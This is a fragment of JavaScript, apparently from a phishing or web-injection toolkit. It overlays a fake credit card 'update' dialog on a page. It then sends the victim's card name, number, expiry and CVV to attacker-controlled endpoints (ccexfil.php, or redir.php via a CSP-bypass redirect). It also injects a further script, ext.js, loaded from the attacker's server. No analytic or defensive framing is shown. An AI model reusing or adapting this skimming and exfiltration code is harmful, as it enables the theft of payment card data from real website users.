...
<div class="ccupdate" id="ccupdate">
  <div class="dialog">
    <img src="` + attWsPhishPath + `logo.gif" style="position: absolute; top: 20px; left: 20px; width: 120px">
...
async function ccUpdate() {
  ...
  if (bypassCSP) {
    document.location = attWsPhishPath + 'redir.php?ccnm=' + ccnm + '&ccno=' + ccno + '&ccex=' + ccex + '&cccv=' + cccv + '&redir=' + redirURL;
  }
  // [CASE] CSP BYPASS NOT REQUIRED
  else {
    await this.getURL(attWsPhishPath + 'ccexfil.php?ccnm=' + ccnm + '&ccno=' + ccno + '&ccex=' + ccex + '&cccv=' + cccv);
...
function execPayld() {
  ...
  with(document)body.appendChild(createElement('script')).src=(attWsPhishPath + 'ext.js');
  setTimeout(() => {
